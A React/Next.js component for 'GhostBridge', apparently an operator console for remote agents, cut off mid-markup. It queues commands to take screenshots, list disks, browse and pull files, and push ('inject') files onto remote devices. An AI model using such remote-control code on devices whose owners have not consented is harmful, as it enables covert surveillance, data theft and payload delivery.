"use client";

import { useState, useEffect, useCallback } from "react";
import {
  Monitor,
  HardDrive,
  Cpu,
  Terminal,
  RefreshCw,
  Folder,
  File,
  Image as ImageIcon,
  Home,
  Lock,
  Trash2,
  Pencil,
  FileText,
  Music,
  Video,
  FileArchive,
  FileCode,
  FileJson,
  ArrowUp,
  Upload,
  Info,
  Server,
  Activity,
  Layers,
  Menu,
  X,
} from "lucide-react";
import { Button } from "@/components/ui/button";
// import { Badge } from "@/components/ui/badge";
import { ScrollArea } from "@/components/ui/scroll-area";
import {
  Dialog,
  DialogContent,
  DialogHeader,
  DialogTitle,
} from "@/components/ui/dialog";
import { toast } from "sonner";
import { cn } from "@/lib/cn";
import { useDevMode } from "@/lib/hooks/useDevMode";
import Image from "next/image";

// Tipe Data
interface DeviceStatus {
  id: string;
  name: string;
  ram_usage: number;
  ram_total: number;
  cpu_usage: number;
  cpu_brand: string;
  platform: string;
  os_type: string;
  user: string;
  last_seen: number;
  is_online: boolean;
}

type FileEntry = {
  name: string;
  kind: "file" | "dir";
  size: string;
};

export default function GhostBridge() {
  const { isDevMode, unlockDevMode } = useDevMode();
  const [devices, setDevices] = useState<DeviceStatus[]>([]);
  const [selectedDevice, setSelectedDevice] = useState<DeviceStatus | null>(
    null,
  );
  const [currentPath, setCurrentPath] = useState("THIS_PC");
  const [files, setFiles] = useState<FileEntry[]>([]);
  const [disks, setDisks] = useState<any[]>([]);
  const [isLoadingFiles, setIsLoadingFiles] = useState(false);
  const [passwordInput, setPasswordInput] = useState("");
  const [screenshot, setScreenshot] = useState<string | null>(null); // Base64
  const [isScreenshotOpen, setIsScreenshotOpen] = useState(false);
  const [deviceSearch, setDeviceSearch] = useState("");
  const [fileSearch, setFileSearch] = useState("");
  const [isInfoOpen, setIsInfoOpen] = useState(false);
  const [isUploading, setIsUploading] = useState(false);
  const [selectedInfoDevice, setSelectedInfoDevice] =
    useState<DeviceStatus | null>(null);
  const [isSidebarOpen, setIsSidebarOpen] = useState(false);
  // const [viewMode, setViewMode] = useState<"grid" | "list">("grid");

  // --- 1. DEVICE POLLING ---
  useEffect(() => {
    if (!isDevMode) return;

    const fetchDevices = async () => {
      try {
        const res = await fetch("/api/ghost?action=list_devices");
        if (res.ok) {
          const data = await res.json();
          setDevices(data);
        }
      } catch (e) {
        console.error(e);
      }
    };

    fetchDevices();
    const interval = setInterval(fetchDevices, 5000); // Update list tiap 5s
    return () => clearInterval(interval);
  }, [isDevMode]);

  // --- 2. COMMAND HANDLER (WITH POLLING) ---
  const sendCommand = async (cmd: string, args: string | null = null) => {
    if (!selectedDevice) return null;

    const startTime = Date.now();

    // 1. Queue Command
    try {
      await fetch("/api/ghost", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          action: "queue_command",
          deviceId: selectedDevice.id,
          command: cmd,
          args: args,
        }),
      });

      // 2. Poll for Result
      for (let i = 0; i < 20; i++) {
        await new Promise((r) => setTimeout(r, 1000));

        const res = await fetch(
          `/api/ghost?action=get_result&deviceId=${selectedDevice.id}`,
        );
        if (res.ok) {
          const result = await res.json();

          if (result && result.timestamp > startTime) {
            return result;
          }
        }
      }
      throw new Error("Agent connection timeout");
    } catch (error: any) {
      toast.error(error.message || "Failed to execute command");
      return null;
    }
  };

  // --- FILTERING ---
  const filteredDevices = devices.filter(
    (d) =>
      d.name.toLowerCase().includes(deviceSearch.toLowerCase()) ||
      d.id.toLowerCase().includes(deviceSearch.toLowerCase()),
  );

  const filteredFiles = files.filter((f) =>
    f.name.toLowerCase().includes(fileSearch.toLowerCase()),
  );

  // --- FILE EXPLORER LOGIC ---
  const fetchDisks = useCallback(async () => {
    if (!selectedDevice) return;
    setIsLoadingFiles(true);
    const toastId = toast.loading("Fetching available disks...");

    try {
      const result = await sendCommand("LIST_DISKS");
      if (result && result.status === "DONE") {
        setDisks(result.data.disks);
        setCurrentPath("THIS_PC");
        toast.success("Disks loaded", { id: toastId });
      } else {
        toast.error("Failed to fetch disks", { id: toastId });
      }
    } catch (e) {
      toast.error("An error occurred", { id: toastId });
    } finally {
      setIsLoadingFiles(false);
    }
  }, [selectedDevice]);

  const fetchDirectory = useCallback(
    async (path: string) => {
      if (!selectedDevice) return;
      if (path === "THIS_PC") {
        fetchDisks();
        return;
      }

      setIsLoadingFiles(true);
      const toastId = toast.loading(`Scanning: ${path}`);

      try {
        const result = await sendCommand("LS", path);

        if (result && result.status === "DONE") {
          setFiles(result.data.files);
          setCurrentPath(result.data.current_path);
          toast.success("Directory loaded", { id: toastId });
        } else if (result && result.status === "ERROR") {
          toast.error(result.data.message, { id: toastId });
        } else {
          toast.error("Failed to fetch directory", { id: toastId });
        }
      } catch (e) {
        toast.error("An error occurred", { id: toastId });
      } finally {
        setIsLoadingFiles(false);
      }
    },
    [selectedDevice, fetchDisks],
  );

  // Auto-load when device selected
  useEffect(() => {
    if (selectedDevice) {
      fetchDisks();
    }
  }, [selectedDevice, fetchDisks]);

  // --- SCREENSHOT LOGIC ---
  const handleScreenshot = async () => {
    if (!selectedDevice) return;
    const toastId = toast.loading("Capturing remote screen...");

    try {
      const result = await sendCommand("SCREENSHOT");

      if (result && result.status === "DONE") {
        setScreenshot(result.data.image || result.data.url);
        setIsScreenshotOpen(true);
        toast.success("Screenshot captured", { id: toastId });
      } else {
        toast.error(result?.data?.message || "Capture failed", { id: toastId });
      }
    } catch (e) {
      toast.error("Capture failed", { id: toastId });
    }
  };

  const handleDownloadFile = async (fileName: string) => {
    if (!selectedDevice || !currentPath) return;
    const fullPath = joinPath(currentPath, fileName);
    const toastId = toast.loading(`Preparing file: ${fileName}...`);

    try {
      const result = await sendCommand("GET_FILE", fullPath);
      if (result && result.status === "DONE") {
        const downloadUrl = result.data.url;
        if (downloadUrl) {
          // Coba buka di tab baru
          const win = window.open(downloadUrl, "_blank");
          if (!win) {
            toast.error("Popup blocked! Please allow popups.", { id: toastId });
          } else {
            toast.success("Download started", { id: toastId });
          }
        }
      } else {
        toast.error(result?.data?.message || "Download failed", {
          id: toastId,
        });
      }
    } catch (e) {
      toast.error("Download failed", { id: toastId });
    }
  };

  const handleUploadFile = async (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (!file || !selectedDevice || !currentPath) return;

    const toastId = toast.loading(`Uploading ${file.name} to remote node...`);
    setIsUploading(true);

    try {
      // 1. Upload lewat PROXY API (Bypass CORS)
      const formData = new FormData();
      formData.append("file", file);

      const uploadResp = await fetch("/api/ghost/upload", {
        method: "POST",
        body: formData,
      });

      if (!uploadResp.ok)
        throw new Error(`Transfer failed: ${uploadResp.statusText}`);

      const uploadJson = await uploadResp.json();
      if (!uploadJson.success)
        throw new Error(uploadJson.message || "Upload failed");

      const fileUrl = uploadJson.link;
      const destPath = joinPath(currentPath, file.name);

      // 2. Command Agent buat download dari direct URL itu
      const result = await sendCommand(
        "PUT_FILE",
        JSON.stringify({
          url: fileUrl,
          dest: destPath,
        }),
      );

      if (result && result.status === "DONE") {
        toast.success(`${file.name} deployed successfully`, { id: toastId });
        fetchDirectory(currentPath);
      } else {
        toast.error(result?.data?.message || "Remote deployment failed", {
          id: toastId,
        });
      }
    } catch (err: any) {
      toast.error(`Upload error: ${err.message}`, { id: toastId });
    } finally {
      setIsUploading(false);
      e.target.value = ""; // reset input
    }
  };

  // --- CRUD ACTIONS ---
  const handleDeleteDevice = async (e: React.MouseEvent, deviceId: string) => {
    e.stopPropagation();
    if (!confirm("Are you sure you want to remove this device registry?"))
      return;

    try {
      const res = await fetch("/api/ghost", {
        method: "POST",
        body: JSON.stringify({ action: "delete_device", deviceId }),
      });
      if (res.ok) {
        toast.success("Device removed");
        setDevices((prev) => prev.filter((d) => d.id !== deviceId));
        if (selectedDevice?.id === deviceId) setSelectedDevice(null);
      }
    } catch (e) {
      toast.error("Failed to delete");
    }
  };

  const handleRenameDevice = async (e: React.MouseEvent, deviceId: string) => {
    e.stopPropagation();
    const newName = prompt("Enter new device name:");
    if (!newName) return;

    try {
      const res = await fetch("/api/ghost", {
        method: "POST",
        body: JSON.stringify({ action: "update_device", deviceId, newName }),
      });
      if (res.ok) {
        toast.success("Device renamed");
        setDevices((prev) =>
          prev.map((d) => (d.id === deviceId ? { ...d, name: newName } : d)),
        );
      }
    } catch (e) {
      toast.error("Failed to rename");
    }
  };

  // --- ADMIN GUARD ---
  if (!isDevMode) {
    return (
      <div className="flex min-h-screen flex-col items-center justify-center bg-neutral-950 px-4 text-center">
        <div className="relative mb-8">
          <div className="absolute inset-0 animate-pulse rounded-full bg-red-500/20 blur-2xl" />
          <Lock className="relative h-20 w-20 text-red-500" />
        </div>
        <h1 className="mb-2 font-mono text-3xl font-black tracking-tighter text-white">
          SYSTEM RESTRICTED
        </h1>
        <p className="mb-8 max-w-sm text-neutral-500">
          This bridge requires high-level clearance. Please enter the decryption
          key to establish connection.
        </p>

        <form
          onSubmit={(e) => {
            e.preventDefault();
            unlockDevMode(passwordInput);
          }}
          className="w-full max-w-xs space-y-4"
        >
          <div className="group relative">
            <div className="absolute -inset-0.5 rounded-lg bg-linear-to-r from-red-500 to-amber-500 opacity-20 blur transition group-focus-within:opacity-50" />
            <input
              type="password"
              placeholder="Enter Access Code..."
              className="relative w-full rounded-lg border border-neutral-800 bg-neutral-900 px-4 py-3 text-center font-mono tracking-widest text-white outline-hidden focus:border-red-500/50"
              value={passwordInput}
              onChange={(e) => setPasswordInput(e.target.value)}
              autoFocus
            />
          </div>
          <Button
            type="submit"
            className="w-full bg-red-600 font-bold text-white hover:bg-red-700 active:scale-95"
          >
            AUTHORIZE ACCESS
          </Button>
        </form>

        <p className="mt-12 text-[10px] tracking-[0.2em] text-neutral-700 uppercase">
          Authorization Protocol v2.0.4
        </p>
      </div>
    );
  }

  // --- UI RENDER ---
  return (
    <div className="flex h-screen flex-col overflow-hidden bg-[#0a0a0a] text-neutral-100 antialiased selection:bg-teal-500/30">
      <div className="relative flex flex-1 overflow-hidden">
        {/* SIDEBAR: DEVICE LIST */}
        <aside
          className={cn(
            "absolute inset-y-0 left-0 z-50 flex w-72 transform flex-col border-r border-white/5 bg-neutral-900/60 backdrop-blur-3xl transition-all duration-300 lg:static lg:w-80 lg:translate-x-0",
            isSidebarOpen
              ? "translate-x-0"
              : "-translate-x-full lg:translate-x-0",
          )}
        >
          {/* Mobile Close Button */}
          <Button
            variant="ghost"
            size="icon"
            className="absolute top-4 right-2 text-neutral-500 lg:hidden"
            onClick={() => setIsSidebarOpen(false)}
          >
            <X className="h-5 w-5" />
          </Button>

          <div className="p-6">
            <div className="mb-6 flex items-center justify-between">
              <div>
                <h2 className="flex items-center gap-2 text-xl font-black tracking-tight text-white uppercase">
                  <div className="relative">
                    <Monitor className="h-5 w-5 text-teal-400" />
                    <div className="absolute -top-1 -right-1 h-2 w-2 animate-ping rounded-full bg-teal-500 opacity-75" />
                  </div>
                  Ghost
                  <span className="text-teal-500">Net</span>
                </h2>
                <p className="mt-1 text-[10px] font-medium tracking-widest text-neutral-500 uppercase">
                  {devices.length} Nodes Online
                </p>
              </div>
            </div>

            {/* Device Search */}
            <div className="group relative mb-4">
              <div className="pointer-events-none absolute inset-y-0 left-3 flex items-center">
                <Terminal className="h-3 w-3 text-neutral-600 transition-colors group-focus-within:text-teal-500" />
              </div>
              <input
                type="text"
                placeholder="Scan node ID..."
                className="h-9 w-full rounded-lg border border-white/5 bg-black/40 pr-4 pl-9 font-mono text-xs text-neutral-300 outline-hidden transition-all focus:border-teal-500/50 focus:bg-black/60"
                value={deviceSearch}
                onChange={(e) => setDeviceSearch(e.target.value)}
              />
            </div>
          </div>

          <ScrollArea className="flex-1 px-4 pb-4">
            <div className="space-y-2">
              {filteredDevices.map((dev) => (
                <div
                  key={dev.id}
                  onClick={() => {
                    setSelectedDevice(dev);
                    setIsSidebarOpen(false); // Close on mobile after selection
                  }}
                  className={cn(
                    "group relative cursor-pointer overflow-hidden rounded-xl border border-white/3 bg-neutral-900/40 p-3 transition-all duration-300 hover:border-white/10 hover:bg-neutral-800/60",
                    selectedDevice?.id === dev.id &&
                      "border-teal-500/30 bg-teal-500/5 shadow-[0_0_20px_rgba(20,184,166,0.05)]",
                    !dev.is_online && "opacity-60 saturate-0",
                  )}
                >
                  {/* Status Indicator Bar */}
                  <div
                    className={cn(
                      "absolute top-0 bottom-0 left-0 w-1 transition-all duration-500",
                      dev.is_online ? "bg-teal-500" : "bg-neutral-700",
                      selectedDevice?.id === dev.id
                        ? "opacity-100"
                        : "opacity-0 group-hover:opacity-50",
                    )}
                  />

                  <div className="mb-2 flex items-center justify-between pl-1">
                    <span className="text-xs font-bold tracking-tight text-white uppercase transition-colors group-hover:text-teal-300">
                      {dev.name}
                    </span>
                    <div className="flex items-center gap-1.5">
                      <div
                        className={cn(
                          "h-1.5 w-1.5 rounded-full",
                          dev.is_online
                            ? "bg-teal-500 shadow-[0_0_8px_rgba(20,184,166,1)]"
                            : "bg-neutral-700",
                        )}
                      />
                      <span
                        className={cn(
                          "text-[9px] font-black tracking-tighter",
                          dev.is_online ? "text-teal-500" : "text-neutral-600",
                        )}
                      >
                        {dev.is_online ? "CONNECTED" : "OFFLINE"}
                      </span>
                    </div>
                  </div>

                  <div className="truncate pl-1 font-mono text-[9px] text-neutral-600 transition-colors group-hover:text-neutral-400">
                    {dev.id}
                  </div>

                  <div className="mt-3 flex items-center justify-between pl-1">
                    <div className="flex gap-2 text-[9px] font-bold text-neutral-500 uppercase">
                      <span className="flex items-center gap-1 rounded border border-white/5 bg-black/30 px-1.5 py-0.5">
                        <Cpu className="h-2 w-2" /> {dev.platform.split(" ")[0]}
                      </span>
                    </div>

                    <div className="flex gap-1 opacity-20 transition-all duration-300 group-hover:opacity-100">
                      <Button
                        variant="ghost"
                        size="icon"
                        className="h-6 w-6 rounded-md hover:bg-white/10 hover:text-white"
                        onClick={(e) => {
                          e.stopPropagation();
                          setSelectedInfoDevice(dev);
                          setIsInfoOpen(true);
                        }}
                      >
                        <Info className="h-3 w-3" />
                      </Button>
                      <Button
                        variant="ghost"
                        size="icon"
                        className="h-6 w-6 rounded-md hover:bg-white/10 hover:text-white"
                        onClick={(e) => handleRenameDevice(e, dev.id)}
                      >
                        <Pencil className="h-3 w-3" />
                      </Button>
                      <Button
                        variant="ghost"
                        size="icon"
                        className="h-6 w-6 rounded-md hover:bg-red-500/20 hover:text-red-400"
                        onClick={(e) => handleDeleteDevice(e, dev.id)}
                      >
                        <Trash2 className="h-3 w-3" />
                      </Button>
                    </div>
                  </div>
                </div>
              ))}
              {filteredDevices.length === 0 && (
                <div className="p-8 text-center font-mono text-[10px] text-neutral-600 uppercase">
                  No nodes found in sector
                </div>
              )}
            </div>
          </ScrollArea>
        </aside>

        {/* MAIN CONTENT */}
        <main className="relative flex min-w-0 flex-1 flex-col overflow-hidden bg-[#050505]">
          {/* Mobile Overlay */}
          {isSidebarOpen && (
            <div
              className="absolute inset-0 z-40 bg-black/60 backdrop-blur-sm lg:hidden"
              onClick={() => setIsSidebarOpen(false)}
            />
          )}

          {/* Subtle Background Glow */}
          <div className="absolute top-0 right-0 -mt-32 -mr-32 h-96 w-96 rounded-full bg-teal-500/5 blur-[120px]" />

          {selectedDevice ? (
            <>
              {/* TOOLBAR */}
              <header className="relative z-10 flex h-16 items-center justify-between border-b border-white/5 bg-black/40 px-4 backdrop-blur-xl lg:px-8">
                <div className="flex items-center gap-3 overflow-hidden lg:gap-4">
                  <Button
                    variant="ghost"
                    size="icon"
                    className="h-9 w-9 text-teal-500 lg:hidden"
                    onClick={() => setIsSidebarOpen(true)}
                  >
                    <Menu className="h-5 w-5" />
                  </Button>

                  <div className="flex h-10 w-10 shrink-0 items-center justify-center rounded-xl border border-white/5 bg-neutral-900/50 shadow-inner sm:flex">
                    <Terminal className="h-5 w-5 text-teal-500" />
                  </div>
                  <div className="overflow-hidden">
                    <h1 className="truncate text-xs font-black tracking-tight text-white uppercase sm:text-sm">
                      {selectedDevice.name}
                    </h1>
                    <div className="mt-0.5 flex items-center gap-2 overflow-hidden">
                      <span className="truncate font-mono text-[9px] text-neutral-500 sm:text-[10px]">
                        {selectedDevice.user}
                      </span>
                      <div className="h-0.5 w-0.5 shrink-0 rounded-full bg-neutral-700" />
                      <span className="line-clamp-1 truncate font-mono text-[9px] text-neutral-500 sm:text-[10px]">
                        {selectedDevice.platform}
                      </span>
                    </div>
                  </div>
                </div>
                <div className="flex items-center gap-2 sm:gap-3">
                  <Button
                    variant="outline"
                    size="sm"
                    onClick={handleScreenshot}
                    className="h-8 border-white/5 bg-white/5 px-2 text-[9px] font-black tracking-widest uppercase transition-all hover:border-teal-500/30 hover:bg-white/10 active:scale-95 sm:h-9 sm:px-3 sm:text-[11px]"
                  >
                    <ImageIcon className="h-3 w-3 text-teal-400 sm:mr-2 sm:h-3.5 sm:w-3.5" />
                    <span className="hidden sm:inline">Capture</span>
                  </Button>
                  <Button
                    variant="ghost"
                    size="sm"
                    onClick={() => setSelectedDevice(null)}
                    className="h-8 text-[9px] font-bold tracking-widest text-neutral-500 uppercase hover:text-red-400 sm:h-9 sm:text-[11px]"
                  >
                    <span className="hidden sm:inline">Disconnect</span>
                    <X className="h-4 w-4 sm:hidden" />
                  </Button>
                </div>
              </header>

              {/* FILE EXPLORER */}
              <div className="relative z-10 flex flex-1 flex-col overflow-hidden p-6 lg:p-10">
                {/* Navigation & Controls */}
                <div className="mb-6 flex flex-col gap-4 lg:flex-row lg:items-center">
                  <div className="flex flex-1 items-center gap-1.5 overflow-hidden rounded-xl border border-white/5 bg-neutral-900/30 p-1.5 backdrop-blur-md">
                    <Button
                      variant="ghost"
                      size="icon"
                      onClick={() => fetchDirectory("THIS_PC")}
                      className="h-8 w-8 text-neutral-500 hover:text-white"
                    >
                      <Home className="h-4 w-4" />
                    </Button>
                    <div className="mx-1 h-4 w-px bg-white/5" />
                    <Button
                      variant="ghost"
                      size="icon"
                      onClick={() => {
                        if (currentPath === "THIS_PC") return;
                        const parts = currentPath
                          .split("\\")
                          .filter((p) => p !== "");
                        if (parts.length <= 1) {
                          fetchDirectory("THIS_PC");
                          return;
                        }
                        parts.pop();
                        let newPath = parts.join("\\");
                        if (!newPath.endsWith("\\")) newPath += "\\";
                        fetchDirectory(newPath);
                      }}
                      className="h-8 w-8 text-neutral-500 hover:text-white"
                      disabled={currentPath === "THIS_PC"}
                    >
                      <ArrowUp className="h-4 w-4" />
                    </Button>

                    {/* Breadcrumbs Path Display */}
                    <div className="scrollbar-none no-scrollbar flex flex-1 items-center gap-1 overflow-x-auto px-2">
                      {currentPath === "THIS_PC" ? (
                        <span className="text-[11px] font-black tracking-widest whitespace-nowrap text-teal-500 uppercase">
                          ROOT_FS://THIS_PC
                        </span>
                      ) : (
                        <div className="flex items-center gap-1 whitespace-nowrap">
                          {currentPath
                            .split("\\")
                            .filter((p) => p)
                            .map((part, idx, arr) => (
                              <div
                                key={idx}
                                className="flex items-center gap-1"
                              >
                                <span
                                  className={cn(
                                    "cursor-pointer font-mono text-[10px] transition-colors",
                                    idx === arr.length - 1
                                      ? "font-bold text-white"
                                      : "text-neutral-500 hover:text-neutral-300",
                                  )}
                                  onClick={() => {
                                    const p =
                                      arr.slice(0, idx + 1).join("\\") + "\\";
                                    fetchDirectory(p);
                                  }}
                                >
                                  {part}
                                </span>
                                {idx < arr.length - 1 && (
                                  <span className="font-mono text-[10px] text-neutral-700">
                                    /
                                  </span>
                                )}
                              </div>
                            ))}
                        </div>
                      )}
                    </div>

                    <div className="mx-1 h-4 w-px bg-white/5" />
                    <Button
                      size="icon"
                      variant="ghost"
                      onClick={() => fetchDirectory(currentPath)}
                      className="h-8 w-8 text-neutral-500 hover:text-teal-400"
                    >
                      <RefreshCw
                        className={cn(
                          "h-3.5 w-3.5",
                          isLoadingFiles && "animate-spin",
                        )}
                      />
                    </Button>
                  </div>

                  {/* File Search & Toggle */}
                  <div className="flex items-center gap-2">
                    <div className="group relative min-w-[200px]">
                      <Terminal className="absolute top-1/2 left-3 h-3 w-3 -translate-y-1/2 text-neutral-600 group-focus-within:text-teal-500" />
                      <input
                        type="text"
                        placeholder="Filter protocol..."
                        className="h-9 w-full rounded-xl border border-white/5 bg-neutral-900/30 pr-4 pl-9 font-mono text-xs text-neutral-400 outline-hidden transition-all focus:border-teal-500/50"
                        value={fileSearch}
                        onChange={(e) => setFileSearch(e.target.value)}
                      />
                    </div>

                    {currentPath !== "THIS_PC" && (
                      <>
                        <input
                          type="file"
                          id="file-upload"
                          className="hidden"
                          onChange={handleUploadFile}
                        />
                        <Button
                          variant="outline"
                          size="sm"
                          className="h-9 border-teal-500/20 bg-teal-500/5 text-[10px] font-black tracking-widest text-teal-400 uppercase hover:bg-teal-500/20"
                          onClick={() =>
                            document.getElementById("file-upload")?.click()
                          }
                          disabled={isUploading}
                        >
                          <Upload
                            className={cn(
                              "mr-2 h-3.5 w-3.5",
                              isUploading && "animate-bounce",
                            )}
                          />
                          {isUploading ? "Uploading..." : "Inject File"}
                        </Button>
                      </>
                    )}
                  </div>
                </div>

                {/* Files Display Container */}
                <div className="flex-1 overflow-hidden rounded-2xl border border-white/4 bg-neutral-950/40 p-2 shadow-2xl backdrop-blur-xs">
                  <ScrollArea className="h-full">
                    <div className="p-4">
                      {isLoadingFiles ? (
                        <div className="flex h-64 flex-col items-center justify-center text-neutral-600">
                          <div className="relative mb-6">
                            <RefreshCw className="h-10 w-10 animate-spin text-teal-500/50" />
                            <div className="absolute inset-0 h-10 w-10 animate-pulse rounded-full bg-teal-500/10 blur-xl" />
                          </div>
                          <p className="font-mono text-[11px] tracking-[0.2em] uppercase transition-all">
                            Synchronizing Data Streams...
                          </p>
                        </div>
                      ) : (
                        <div className="grid grid-cols-2 gap-3 sm:grid-cols-3 md:grid-cols-4 lg:grid-cols-6 xl:grid-cols-8">
                          {currentPath === "THIS_PC" ? (
                            disks.map((disk, i) => (
                              <div
                                key={i}
                                className="group relative flex cursor-pointer flex-col items-center gap-3 overflow-hidden rounded-xl border border-white/3 bg-neutral-900/30 px-3 py-6 text-center transition-all duration-300 hover:border-teal-500/20 hover:bg-teal-500/2 hover:shadow-[0_0_20px_rgba(20,184,166,0.05)] active:scale-95"
                                onClick={() => fetchDirectory(disk.mount_point)}
                              >
                                <div className="relative">
                                  <HardDrive className="h-10 w-10 text-teal-400/80 transition-transform duration-500 group-hover:scale-110 group-hover:text-teal-400" />
                                  <div className="absolute inset-0 bg-teal-500/20 opacity-0 blur-xl transition-opacity group-hover:opacity-100" />
                                </div>
                                <div className="space-y-1">
                                  <span className="block w-full truncate text-[11px] font-black tracking-tight text-white uppercase">
                                    {disk.name ||
                                      `DRIVE_${disk.mount_point.replace(":", "")}`}
                                  </span>
                                  <div className="mx-auto mt-1 h-1 w-full max-w-[40px] overflow-hidden rounded-full bg-neutral-800">
                                    <div className="h-full w-[60%] bg-teal-500 opacity-50" />
                                  </div>
                                  <span className="block font-mono text-[9px] tracking-tighter text-neutral-500 uppercase">
                                    {disk.available_space} / {disk.total_space}
                                  </span>
                                </div>
                              </div>
                            ))
                          ) : (
                            <>
                              {filteredFiles.map((file, i) => (
                                <div
                                  key={i}
                                  className="group flex cursor-pointer flex-col items-center gap-3 rounded-xl border border-transparent px-2 py-5 text-center transition-all duration-300 hover:border-white/5 hover:bg-white/2 active:scale-95"
                                  onClick={() => {
                                    if (file.kind === "dir")
                                      fetchDirectory(
                                        joinPath(currentPath, file.name),
                                      );
                                    else handleDownloadFile(file.name);
                                  }}
                                >
                                  <div className="relative">
                                    {file.kind === "dir" ? (
                                      <Folder className="h-10 w-10 text-amber-400/80 transition-transform duration-300 group-hover:scale-110 group-hover:text-amber-400" />
                                    ) : (
                                      getFileIcon(file.name)
                                    )}
                                    <div
                                      className={cn(
                                        "absolute inset-0 opacity-0 blur-xl transition-opacity group-hover:opacity-30",
                                        file.kind === "dir"
                                          ? "bg-amber-500"
                                          : "bg-blue-500",
                                      )}
                                    />
                                  </div>
                                  <div className="w-full space-y-1">
                                    <span className="block w-full truncate text-[11px] font-medium text-neutral-300 transition-colors group-hover:text-white">
                                      {file.name}
                                    </span>
                                    {file.kind === "file" && (
                                      <span className="block font-mono text-[9px] tracking-tighter text-neutral-600 uppercase">
                                        {file.size}
                                      </span>
                                    )}
                                  </div>
                                </div>
                              ))}
                              {filteredFiles.length === 0 && (
                                <div className="col-span-full py-20 text-center">
                                  <div className="mb-4 inline-flex h-12 w-12 items-center justify-center rounded-2xl border border-white/5 bg-neutral-900">
                                    <Terminal className="h-5 w-5 text-neutral-700" />
                                  </div>
                                  <p className="font-mono text-[10px] tracking-[0.3em] text-neutral-600 uppercase">
                                    No valid signatures found
                                  </p>
                                </div>
                              )}
                            </>
                          )}
                        </div>
                      )}
                    </div>
                  </ScrollArea>
                </div>
              </div>
            </>
          ) : (
            <div className="relative flex flex-1 flex-col items-center justify-center space-y-8 overflow-hidden p-6">
              {/* Mobile Sidebar Toggle when no device selected */}
              <Button
                variant="outline"
                className="absolute top-6 left-6 border-white/5 bg-white/5 lg:hidden"
                onClick={() => setIsSidebarOpen(true)}
              >
                <Menu className="mr-2 h-4 w-4" />
                Select Node
              </Button>

              {/* Center Glow Effect */}
              <div className="absolute h-64 w-64 rounded-full bg-teal-500/5 blur-[120px]" />
              <div className="absolute h-96 w-96 animate-pulse rounded-full bg-teal-400/2 blur-[150px]" />

              <div className="relative">
                <Monitor className="h-24 w-24 text-teal-500/20" />
                <div className="absolute inset-0 bottom-4 flex items-center justify-center">
                  <RefreshCw className="animate-spin-slow h-8 w-8 text-teal-500/40" />
                </div>
              </div>

              <div className="space-y-2 text-center">
                <h3 className="text-xs font-black tracking-[0.4em] text-neutral-600 uppercase">
                  Awaiting Uplink
                </h3>
                <p className="font-mono text-[11px] tracking-wider text-neutral-700 uppercase">
                  Select a node from the Ghost Network to begin synchronization
                </p>
              </div>

              <div className="flex gap-4 opacity-20 transition-opacity hover:opacity-100">
                {[1, 2, 3].map((i) => (
                  <div
                    key={i}
                    className="h-1 w-8 rounded-full bg-neutral-800"
                  />
                ))}
              </div>
            </div>
          )}
        </main>
      </div>

      {/* SCREENSHOT MODAL: Premium Styled */}
      <Dialog open={isScreenshotOpen} onOpenChange={setIsScreenshotOpen}>
        <DialogContent className="max-w-6xl border-white/5 bg-neutral-950/90 p-1 backdrop-blur-2xl">
          <div className="rounded-xl bg-black/40 p-2 lg:p-4">
            <DialogHeader className="mb-4 flex flex-row items-center justify-between px-2 pt-2">
              <div className="flex items-center gap-3">
                <div className="h-2 w-2 rounded-full bg-teal-500 shadow-[0_0_8px_rgba(20,184,166,1)]" />
                <DialogTitle className="font-mono text-[11px] font-black tracking-[0.3em] text-neutral-400 uppercase">
                  Remote Viewport Synchronization
                </DialogTitle>
              </div>
            </DialogHeader>
            <div className="relative aspect-video w-full overflow-hidden rounded-lg border border-white/5 bg-[#050505] shadow-2xl">
              {screenshot ? (
                <Image
                  src={
                    screenshot.startsWith("http")
                      ? screenshot
                      : `data:image/png;base64,${screenshot}`
                  }
                  alt="Remote System Surface"
                  fill
                  unoptimized // Important for base64 or high-res remote images
                  className="object-contain"
                />
              ) : (
                <div className="flex h-full items-center justify-center">
                  <div className="flex flex-col items-center gap-4">
                    <RefreshCw className="h-10 w-10 animate-spin text-teal-500/20" />
                    <span className="font-mono text-[10px] tracking-widest text-neutral-600 uppercase">
                      Decoding Visual Buffer...
                    </span>
                  </div>
                </div>
              )}
            </div>
            <div className="mt-4 flex justify-end gap-2 px-2 pb-2">
              <Button
                variant="outline"
                size="sm"
                onClick={() => {
                  const link = document.createElement("a");
                  link.href = screenshot?.startsWith("http")
                    ? screenshot
                    : `data:image/png;base64,${screenshot}`;
                  link.download = `GhostView_${new Date().getTime()}.png`;
                  link.click();
                }}
                className="h-8 border-white/5 bg-white/5 text-[9px] font-black tracking-widest uppercase"
              >
                Dump Memory
              </Button>
              <Button
                variant="destructive"
                size="sm"
                onClick={() => setIsScreenshotOpen(false)}
                className="h-8 text-[9px] font-black tracking-widest uppercase"
              >
                Close Viewport
              </Button>
            </div>
          </div>
        </DialogContent>
      </Dialog>

      {/* DEVICE INFO DIALOG */}
      <Dialog open={isInfoOpen} onOpenChange={setIsInfoOpen}>
        <DialogContent className="max-w-md border-white/5 bg-neutral-950/90 p-6 backdrop-blur-3xl">
          <DialogHeader className="mb-6 flex flex-row items-center gap-4">
            <div className="flex h-12 w-12 items-center justify-center rounded-2xl border border-teal-500/20 bg-teal-500/10">
              <Server className="h-6 w-6 text-teal-500" />
            </div>
            <div>
              <DialogTitle className="text-lg font-black tracking-tight text-white uppercase">
                {selectedInfoDevice?.name}
              </DialogTitle>
              <span className="block font-mono text-[10px] text-neutral-500">
                NODE_UPLINK: {selectedInfoDevice?.id}
              </span>
            </div>
          </DialogHeader>

          <div className="grid grid-cols-2 gap-4">
            <div className="rounded-xl border border-white/5 bg-white/2 p-4">
              <div className="mb-2 flex items-center gap-2 text-neutral-500">
                <Activity className="h-3 w-3" />
                <span className="text-[9px] font-black tracking-widest uppercase">
                  CPU LOAD
                </span>
              </div>
              <div className="text-xl font-black text-white">
                {selectedInfoDevice?.cpu_usage.toFixed(2)}%
              </div>
              <div className="mt-1 truncate font-mono text-[9px] text-neutral-600">
                {selectedInfoDevice?.cpu_brand}
              </div>
            </div>

            <div className="rounded-xl border border-white/5 bg-white/2 p-4">
              <div className="mb-2 flex items-center gap-2 text-neutral-500">
                <Layers className="h-3 w-3" />
                <span className="text-[9px] font-black tracking-widest uppercase">
                  MEMORY
                </span>
              </div>
              <div className="text-xl font-black text-white">
                {selectedInfoDevice?.ram_usage} MB
              </div>
              <div className="mt-1 font-mono text-[9px] text-neutral-600">
